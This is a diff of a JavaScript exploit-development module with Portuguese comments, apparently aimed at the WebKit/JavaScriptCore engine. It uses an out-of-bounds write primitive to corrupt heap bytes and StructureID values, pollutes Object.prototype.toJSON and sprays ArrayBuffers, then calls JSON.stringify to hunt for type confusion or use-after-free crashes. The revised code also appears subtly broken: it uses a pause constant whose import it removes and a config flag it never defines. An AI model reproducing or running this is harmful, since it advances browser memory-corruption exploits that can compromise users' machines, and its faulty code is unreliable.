@@ -1,228 +1,183 @@
 // js/script3/testJsonTypeConfusionUAFSpeculative.mjs
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
+import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
 import {
-    triggerOOB_primitive, oob_array_buffer_real,
+    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
     oob_write_absolute, oob_read_absolute, clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';
+import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
 // --- Parâmetros de Teste Configuráveis ---
 const SPECULATIVE_TEST_CONFIG = {
-    victim_ab_size: 64, // Tamanho do ArrayBuffer que acreditamos estar corrompendo
-    
-    // Offset específico (relativo ao início de oob_array_buffer_real) onde o crash foi observado.
-    // Ajuste este valor se o crash ocorrer em um offset diferente.
-    corruption_target_offset_focus: 0x70, 
-
-    // Valores a serem escritos no offset de corrupção
-    values_to_write_for_corruption: [
-        0xFFFFFFFF, // O valor que causou o crash original
-        0x00000000, // Tentar anular (pode ser StructureID inválido ou um ponteiro)
-        0x00000001, // Um StructureID pequeno e provavelmente inválido
-        0x41414141, // "AAAA" - um padrão comum para depuração
-        0x42424242, // "BBBB"
-        // Adicionar KNOWN_STRUCTURE_IDS (convertidos para número)
-        // Se KNOWN_STRUCTURE_IDS não estiverem preenchidos, parseInt retornará NaN e serão filtrados.
-        ...(Object.values(KNOWN_STRUCTURE_IDS)
-            .map(idStr => parseInt(idStr, 16))
-            .filter(idNum => !isNaN(idNum) && idNum !== null)),
-        // Adicionar alguns valores que podem ser IDs de estrutura válidos ou próximos a eles
-        // Estes são apenas exemplos hipotéticos
-        0x07000100, // Exemplo hipotético para TYPE_ARRAY_BUFFER
-        0x0A000200, // Exemplo hipotético para TYPE_JS_FUNCTION
-        0x01000000, // Exemplo hipotético para TYPE_JS_OBJECT_GENERIC
-    ].filter((value, index, self) => self.indexOf(value) === index), // Remove duplicatas
-
-    bytes_to_write_for_corruption: 4, // StructureID é geralmente uint32_t (4 bytes)
-    ppKey: 'toJSON', // Chave do protótipo a ser poluída
-    stop_on_first_error_in_toJSON: true, // Parar se um erro for capturado dentro do toJSON poluído
-    spray_count_victim_ab: 200, // Número de ArrayBuffers para pulverizar
+    victim_ab_size: 64,
+    // Offsets absolutos dentro de oob_array_buffer_real para tentar corromper.
+    // Adicione mais offsets aqui com base na sua análise do heap e do layout de oob_array_buffer_real.
+    // Lembre-se que o início do oob_dataview_real está em OOB_CONFIG.BASE_OFFSET_IN_DV dentro do oob_array_buffer_real.
+    // Se você quer atingir algo *antes* da sua janela do DataView, use offsets < OOB_CONFIG.BASE_OFFSET_IN_DV.
+    corruption_offsets: [
+        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // Um pouco antes da DataView (StructureID de um objeto anterior?)
+        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 8,
+        (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 4,
+    ],
+    // Valores a serem escritos nos offsets de corrupção (cada um será testado)
+    // Preencha KNOWN_STRUCTURE_IDS em config.mjs com valores reais!
+    values_to_write: [
+        0xFFFFFFFF, // Valor clássico para corrupção
+        0x0,        // Tentar anular um ponteiro ou campo
+        0x1,        // Um StructureID pequeno e provavelmente inválido
+        // parseInt(JSC_OFFSETS.KNOWN_STRUCTURE_IDS.TYPE_JS_FUNCTION, 16) || 0x41414141, // Exemplo de StructureID
+        // parseInt(JSC_OFFSETS.KNOWN_STRUCTURE_IDS.TYPE_FAKE_TARGET_FOR_CONFUSION, 16) || 0x42424242, // Exemplo
+        // Adicione outros StructureIDs ou valores de interesse aqui
+    ],
+    bytes_to_write_for_corruption: 4, // Geralmente StructureIDs são 32-bit
+    ppKey: 'toJSON', // Chave para poluir em Object.prototype
 };
 // --- Fim dos Parâmetros ---
 
 export async function testJsonTypeConfusionUAFSpeculative() {
-    const FNAME = "testJsonTypeConfusionUAFSpeculative_Focused"; // Nome da função para clareza nos logs
-    logS3(`--- Iniciando Teste Focado de UAF/Type Confusion via JSON (S3) (v2.7) ---`, "test", FNAME);
-    logS3(`   Config: victim_size=${SPECULATIVE_TEST_CONFIG.victim_ab_size}, ppKey=${SPECULATIVE_TEST_CONFIG.ppKey}`, "info", FNAME);
-    logS3(`   Alvo de Corrupção Offset Absoluto: ${toHex(SPECULATIVE_TEST_CONFIG.corruption_target_offset_focus)} (em oob_array_buffer_real)`, "info", FNAME);
-    logS3(`   Valores de Teste para Corrupção: ${SPECULATIVE_TEST_CONFIG.values_to_write_for_corruption.map(v => toHex(v)).join(', ')}`, "info", FNAME);
+    const FNAME = "testJsonTypeConfusionUAFSpeculative";
+    logS3(`--- Iniciando Teste Especulativo UAF/Type Confusion via JSON (S3) (v2 - Refinado) ---`, "test", FNAME);
+    logS3(`   Configurações do Teste: victim_size=${SPECULATIVE_TEST_CONFIG.victim_ab_size}, ppKey=${SPECULATIVE_TEST_CONFIG.ppKey}`, "info", FNAME);
+    logS3(`   Offsets de corrupção (abs em oob_real): ${SPECULATIVE_TEST_CONFIG.corruption_offsets.map(o => toHex(o)).join(', ')}`, "info", FNAME);
+    logS3(`   Valores para corrupção: ${SPECULATIVE_TEST_CONFIG.values_to_write.map(v => toHex(v)).join(', ')}`, "info", FNAME);
 
-    let overallTestSuccess = false; // Indica se um erro útil foi capturado dentro do toJSON
-    let victimAbs_spray = [];
+    let overallTestSuccess = false;
 
-    // Limpeza preliminar de qualquer poluição anterior
-    delete Object.prototype[SPECULATIVE_TEST_CONFIG.ppKey];
+    for (const corruption_offset of SPECULATIVE_TEST_CONFIG.corruption_offsets) {
+        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;
 
-    // Configura o ambiente OOB uma vez no início
-    await triggerOOB_primitive();
-    if (!oob_array_buffer_real) {
-        logS3("Falha crítica ao configurar ambiente OOB. Teste abortado.", "error", FNAME);
-        return;
-    }
+        for (const value_to_write of SPECULATIVE_TEST_CONFIG.values_to_write) {
+            if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;
 
-    const corruption_offset_abs = SPECULATIVE_TEST_CONFIG.corruption_target_offset_focus;
-
-    // Validar se o offset focado está dentro dos limites do buffer OOB
-    if (corruption_offset_abs < 0 || corruption_offset_abs + SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption > oob_array_buffer_real.byteLength) {
-        logS3(`Offset de corrupção focado ${toHex(corruption_offset_abs)} está fora dos limites do oob_array_buffer_real (${toHex(oob_array_buffer_real.byteLength)}). Teste abortado.`, "error", FNAME);
-        clearOOBEnvironment();
-        return;
-    }
-
-    // Pulverizar ArrayBuffers vítimas
-    logS3(`Pulverizando ${SPECULATIVE_TEST_CONFIG.spray_count_victim_ab} ArrayBuffers de ${SPECULATIVE_TEST_CONFIG.victim_ab_size} bytes...`, "info", FNAME);
-    for(let i=0; i < SPECULATIVE_TEST_CONFIG.spray_count_victim_ab; i++){
-        try {
-            victimAbs_spray.push(new ArrayBuffer(SPECULATIVE_TEST_CONFIG.victim_ab_size));
-        } catch (e) {
-            logS3(`Falha ao alocar ArrayBuffer de spray ${i+1}: ${e.message}. Parando spray.`, "warn", FNAME);
-            break;
-        }
-    }
-    if (victimAbs_spray.length === 0) {
-        logS3("Nenhum ArrayBuffer vítima pulverizado. Abortando.", "error", FNAME);
-        clearOOBEnvironment();
-        return;
-    }
-    // O target_victim_ab é um dos pulverizados, usado para acionar JSON.stringify.
-    // A corrupção OOB pode atingir qualquer um dos ArrayBuffers pulverizados que calhar de estar no offset alvo.
-    const target_victim_ab_for_stringify = victimAbs_spray[victimAbs_spray.length - 1];
-    logS3(`${victimAbs_spray.length} ArrayBuffers pulverizados. Um deles será o alvo do JSON.stringify.`, "info", FNAME);
-    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para estabilização da heap pós-spray
-
-
-    // Loop principal para testar diferentes valores de corrupção no offset focado
-    for (const value_to_write of SPECULATIVE_TEST_CONFIG.values_to_write_for_corruption) {
-        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_error_in_toJSON) break;
-
-        const ppKey = SPECULATIVE_TEST_CONFIG.ppKey;
-        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-        let pollutionApplied = false;
-        let currentIterationCapturedError = false;
-        let originalValueAtCorruptionOffset = null;
-
-        logS3(`Testando valor de corrupção: ${toHex(value_to_write)} no offset ${toHex(corruption_offset_abs)}`, "subtest", FNAME);
-
-        try {
-            // 1. Ler valor original no offset de corrupção para restauração
-            try {
-                originalValueAtCorruptionOffset = oob_read_absolute(corruption_offset_abs, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
-                logS3(`  Valor original em ${toHex(corruption_offset_abs)}: ${isAdvancedInt64Object(originalValueAtCorruptionOffset) ? originalValueAtCorruptionOffset.toString(true) : toHex(originalValueAtCorruptionOffset)}`, "info", FNAME);
-            } catch (e_read_orig) {
-                logS3(`  AVISO: Falha ao ler valor original em ${toHex(corruption_offset_abs)}: ${e_read_orig.message}. Esta iteração pode não ser restaurável.`, "warn", FNAME);
-                // Continuar mesmo assim, mas a restauração pode falhar ou ser incorreta.
+            await triggerOOB_primitive(); // Configura o ambiente OOB para cada tentativa para isolamento
+            if (!oob_array_buffer_real) {
+                logS3("Falha ao configurar ambiente OOB. Abortando esta iteração.", "error", FNAME);
+                continue;
             }
 
-            // 2. Poluir Object.prototype.toJSON
-            Object.defineProperty(Object.prototype, ppKey, {
-                value: function() {
-                    const currentOperationThis = this; // O objeto sendo stringificado
-                    logS3(`  [${ppKey} Poluído] Chamado! (Teste com Offset: ${toHex(corruption_offset_abs)}, Valor Corruptor: ${toHex(value_to_write)})`, "vuln", FNAME);
-                    
-                    let typeString = "N/A";
-                    let byteLengthVal = "N/A";
-                    try {
-                        typeString = Object.prototype.toString.call(currentOperationThis);
-                        logS3(`    Contexto 'this': Object.prototype.toString.call(this) = ${typeString}`, "info", FNAME);
-                    } catch (e_tostring) {
-                        logS3(`    Contexto 'this': Erro ao chamar Object.prototype.toString.call(this): ${e_tostring.message}`, "warn", FNAME);
-                    }
+            // O ArrayBuffer vítima é recriado para cada tentativa para garantir um estado limpo
+            let victim_ab = new ArrayBuffer(SPECULATIVE_TEST_CONFIG.victim_ab_size);
+            logS3(`ArrayBuffer vítima (${SPECULATIVE_TEST_CONFIG.victim_ab_size} bytes) recriado para esta iteração.`, "info", FNAME);
 
-                    // Verificar se 'this' ainda se parece com um ArrayBuffer esperado
-                    if (!(currentOperationThis instanceof ArrayBuffer && currentOperationThis.byteLength === SPECULATIVE_TEST_CONFIG.victim_ab_size)) {
-                        if (currentOperationThis !== target_victim_ab_for_stringify) { // Adicionalmente checa se não é o AB específico do stringify
-                           logS3(`    AVISO: 'this' (${typeString}) não é o ArrayBuffer vítima esperado ou foi severamente corrompido.`, "warn", FNAME);
+            const ppKey = SPECULATIVE_TEST_CONFIG.ppKey;
+            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+            let pollutionApplied = false;
+            let currentIterationSuccess = false;
+
+            try {
+                logS3(`Tentando poluir Object.prototype.${ppKey} para offset ${toHex(corruption_offset)} com valor ${toHex(value_to_write)}`, "info", FNAME);
+                Object.defineProperty(Object.prototype, ppKey, {
+                    value: function() {
+                        const currentOperationThis = this;
+                        logS3(`[${ppKey} Poluído] Chamado!`, "vuln", FNAME);
+                        logS3(`  typeof this: ${typeof currentOperationThis}`, "info", FNAME);
+                        logS3(`  this instanceof ArrayBuffer: ${currentOperationThis instanceof ArrayBuffer}`, "info", FNAME);
+                        logS3(`  this instanceof Object: ${currentOperationThis instanceof Object}`, "info", FNAME);
+                        try {
+                            logS3(`  this.constructor.name: ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME);
+                        } catch (e) {
+                            logS3(`  Erro ao acessar this.constructor.name: ${e.message}`, "warn", FNAME);
                         }
-                    }
+                        logS3(`  Object.prototype.toString.call(this): ${Object.prototype.toString.call(currentOperationThis)}`, "info", FNAME);
 
-                    try {
-                        // Tentar operações que podem falhar se o tipo for confundido ou a memória estiver corrompida
-                        byteLengthVal = currentOperationThis.byteLength;
-                        logS3(`    'this.byteLength' (tentativa): ${byteLengthVal === undefined ? "undefined" : toHex(byteLengthVal)}`, "info", FNAME);
-                        
-                        // A operação crítica que pode revelar a confusão de tipo / UAF
-                        new DataView(currentOperationThis); 
-                        logS3(`    [${ppKey} Poluído] new DataView(this) criado com SUCESSO. 'this' parece ser um ArrayBuffer válido.`, "good", FNAME);
-                        return { toJSON_executed_ok: true, type: typeString, byteLengthReported: byteLengthVal };
-                    } catch (e_op) {
-                        logS3(`    [${ppKey} Poluído] ERRO AO OPERAR SOBRE 'this': ${e_op.name} - ${e_op.message}`, "critical", FNAME);
-                        logS3(`    ---> SINAL DE TYPE CONFUSION / UAF <--- (Valor Corruptor: ${toHex(value_to_write)})`, "vuln", FNAME);
-                        currentIterationCapturedError = true; // Sinaliza que um erro controlável foi pego
-                        overallTestSuccess = true;
-                        // Retorna um objeto que pode ser identificado no resultado do JSON.stringify
-                        return { toJSON_error: true, error_name: e_op.name, error_message: e_op.message, type_at_error: typeString, byteLength_at_error: byteLengthVal };
-                    }
-                },
-                writable: true, configurable: true, enumerable: false
-            });
-            pollutionApplied = true;
+                        let details = {
+                            byteLength: "N/A (antes da tentativa)",
+                            first_dword: "N/A (antes da tentativa)",
+                            slice_exists: "N/A (antes da tentativa)"
+                        };
+                        try {
+                            // Acessos que podem falhar devido a Type Confusion
+                            details.byteLength = currentOperationThis.byteLength;
+                            if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
+                                let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
+                                let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
+                                if (bufferToView.byteLength >= offsetInView + 4) {
+                                   details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
+                                } else {
+                                   details.first_dword = "Buffer pequeno demais para ler DWORD no offset.";
+                                }
+                            } else {
+                                details.first_dword = "Não é ArrayBuffer ou tipo com buffer para ler DWORD.";
+                            }
 
-            // 3. Realizar a escrita OOB para corromper
-            logS3(`    CORRUPÇÃO: Escrevendo ${toHex(value_to_write)} em ${toHex(corruption_offset_abs)}...`, "warn", FNAME);
-            oob_write_absolute(corruption_offset_abs, value_to_write, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
-            
-            await PAUSE_S3(SHORT_PAUSE_S3 / 2); // Pausa mínima para a escrita OOB ter efeito
+                            details.slice_exists = (typeof currentOperationThis.slice === 'function');
+                            if (details.slice_exists) {
+                                // Chamada de slice pode ser perigosa se 'this' estiver muito corrompido
+                                // currentOperationThis.slice(0,1);
+                                logS3(`  [${ppKey} Poluído] this.slice existe.`, "info", FNAME);
+                            }
 
-            // 4. Chamar JSON.stringify no ArrayBuffer vítima
-            logS3(`    Chamando JSON.stringify(target_victim_ab_for_stringify)...`, "info", FNAME);
-            let stringifyResult = null;
-            try {
-                stringifyResult = JSON.stringify(target_victim_ab_for_stringify);
-                logS3(`    Resultado de JSON.stringify: ${String(stringifyResult).substring(0, 250)}`, "info", FNAME);
-                if (stringifyResult && typeof stringifyResult === 'string') {
-                    if (stringifyResult.includes("toJSON_error:true")) {
-                        logS3("    SUCESSO: Erro foi capturado e retornado pelo toJSON poluído, indicando que o fluxo continuou até lá!", "vuln", FNAME);
-                        // overallTestSuccess já deve ter sido setado como true dentro do toJSON
-                    } else if (stringifyResult.includes("toJSON_executed_ok:true")) {
-                        logS3("    toJSON poluído executou sem erro interno aparente. Nenhuma Type Confusion/UAF óbvia detectada nesta iteração.", "good", FNAME);
-                    }
-                }
-            } catch (e_stringify) {
-                // Se o crash for tão severo que nem o try...catch em volta do JSON.stringify o pega,
-                // ou se o try...catch dentro do toJSON não foi suficiente.
-                logS3(`    CRASH/ERRO EXTERNO durante JSON.stringify: ${e_stringify.name} - ${e_stringify.message}.`, "critical", FNAME);
-                console.error(`CRASH? (JSON.stringify UAF/TC Test Error - Offset: ${toHex(corruption_offset_abs)}, Val: ${toHex(value_to_write)}):`, e_stringify);
-                currentIterationCapturedError = true; // Consideramos um crash aqui como um "sucesso" na detecção
-                overallTestSuccess = true; 
-            }
+                            logS3(`  Detalhes de 'this': byteLength=${details.byteLength}, 1stDword=${details.first_dword === "N/A (antes da tentativa)" ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME);
+                            return { toJSON_executed: true, type: Object.prototype.toString.call(currentOperationThis), details: details };
 
-        } catch (mainIterationError) {
-            logS3(`  Erro INESPERADO na iteração (Valor: ${toHex(value_to_write)}): ${mainIterationError.message}`, "error", FNAME);
-            console.error(`Main Iteration Error (Focused Test):`, mainIterationError);
-        } finally {
-            // 5. Restaurar valor original no offset de corrupção
-            if (originalValueAtCorruptionOffset !== null) {
-                try {
-                    oob_write_absolute(corruption_offset_abs, originalValueAtCorruptionOffset, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
-                    logS3(`    Valor em ${toHex(corruption_offset_abs)} restaurado para ${isAdvancedInt64Object(originalValueAtCorruptionOffset) ? originalValueAtCorruptionOffset.toString(true) : toHex(originalValueAtCorruptionOffset)}.`, "info", "CleanupIter");
-                } catch (e_restore) {
-                    logS3(`    AVISO CRÍTICO: Falha ao restaurar valor em ${toHex(corruption_offset_abs)}. Erro: ${e_restore.message}`, "critical", "CleanupIter");
-                }
-            }
+                        } catch (e) {
+                            logS3(`  [${ppKey} Poluído] ERRO ao acessar propriedades/métodos de 'this': ${e.message}`, "critical", FNAME);
+                            logS3(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)})`, "vuln", FNAME);
+                            currentIterationSuccess = true;
+                            overallTestSuccess = true;
+                            return { toJSON_error: true, message: e.message, type_at_error: Object.prototype.toString.call(currentOperationThis), error_details: details };
+                        }
+                    },
+                    writable: true,
+                    configurable: true,
+                    enumerable: false
+                });
+                pollutionApplied = true;
+                logS3(`Object.prototype.${ppKey} poluído.`, "good", FNAME);
 
-            // 6. Restaurar Object.prototype.toJSON
-            if (pollutionApplied) {
-                if (originalToJSONDescriptor) {
-                    Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
+                // Realizar a escrita OOB especulativa
+                if (corruption_offset >= 0 && corruption_offset + SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
+                    logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption} bytes) em offset absoluto ${toHex(corruption_offset)} do oob_array_buffer_real`, "warn", FNAME);
+                    oob_write_absolute(corruption_offset, value_to_write, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
                 } else {
-                    delete Object.prototype[ppKey];
+                    logS3(`AVISO: Offset de corrupção ${toHex(corruption_offset)} está fora dos limites de oob_array_buffer_real. Pulando escrita.`, "warn", FNAME);
+                    // Continuar mesmo assim para testar o caso sem corrupção OOB (apenas PP)
                 }
-                // logS3(`    Object.prototype.${ppKey} restaurado.`, "info", "CleanupIter");
+
+                await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para efeitos da corrupção
+
+                logS3(`Chamando JSON.stringify(victim_ab) após tentativa de corrupção...`, "info", FNAME);
+                let stringifyResult = null;
+                try {
+                    stringifyResult = JSON.stringify(victim_ab); // PONTO CRÍTICO
+                    logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME);
+                    if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_error:true")) {
+                        // O erro já foi logado dentro do toJSON e currentIterationSuccess setado
+                        logS3("SUCESSO ESPECULATIVO CONFIRMADO: Erro capturado dentro do toJSON poluído.", "vuln", FNAME);
+                    } else if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_executed:true")) {
+                        logS3("JSON.stringify executou toJSON poluído, mas sem erro interno aparente nesta chamada.", "good", FNAME);
+                    }
+                } catch (e) {
+                    logS3(`ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME);
+                    logS3(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)})`, "vuln", FNAME);
+                    console.error(`JSON.stringify UAF/TC Test Error (Offset: ${toHex(corruption_offset)}, Val: ${toHex(value_to_write)}):`, e);
+                    currentIterationSuccess = true;
+                    overallTestSuccess = true;
+                }
+
+            } catch (mainIterationError) {
+                logS3(`Erro na iteração do teste (Offset: ${toHex(corruption_offset)}, Val: ${toHex(value_to_write)}): ${mainIterationError.message}`, "error", FNAME);
+                console.error(mainIterationError);
+            } finally {
+                if (pollutionApplied) {
+                    if (originalToJSONDescriptor) {
+                        Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
+                    } else {
+                        delete Object.prototype[ppKey];
+                    }
+                    // logS3(`Object.prototype.${ppKey} restaurado para esta iteração.`, "info", "CleanupIter");
+                }
+                // O ambiente OOB é limpo no início do próximo loop ou no final do teste
             }
-        } // Fim do try/catch/finally da iteração
+            if (currentIterationSuccess) {
+                 logS3(`Iteração Concluída com SUCESSO ESPECULATIVO (Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)})`, "vuln", FNAME);
+            } else {
+                 logS3(`Iteração Concluída SEM sucesso especulativo óbvio (Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)})`, "info", FNAME);
+            }
+            await PAUSE_S3(SHORT_PAUSE_S3); // Pausa entre sub-testes
+        } // Fim do loop de values_to_write
+    } // Fim do loop de corruption_offsets
 
-        if (currentIterationCapturedError && SPECULATIVE_TEST_CONFIG.stop_on_first_error_in_toJSON) {
-            logS3(`Erro capturado/Crash detectado. Parando teste conforme 'stop_on_first_error_in_toJSON'. Valor problemático: ${toHex(value_to_write)}`, "vuln", FNAME);
-            break; 
-        }
-        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa entre diferentes valores de corrupção
-    } // Fim do loop de values_to_write_for_corruption
-
-    // Limpeza final do ambiente OOB após todas as tentativas
-    clearOOBEnvironment();
-    victimAbs_spray = null; // Ajudar o GC
-    delete Object.prototype[SPECULATIVE_TEST_CONFIG.ppKey]; // Garantir que a poluição foi limpa
-
-    logS3(`--- Teste Focado de UAF/Type Confusion via JSON Concluído (Sucesso na Detecção de Erro/Crash: ${overallTestSuccess}) ---`, "test", FNAME);
+    clearOOBEnvironment(); // Limpa o ambiente OOB ao final de todos os testes
+    logS3(`--- Teste Especulativo UAF/Type Confusion via JSON Concluído (Sucesso Especulativo Geral: ${overallTestSuccess}) ---`, "test", FNAME);
 }
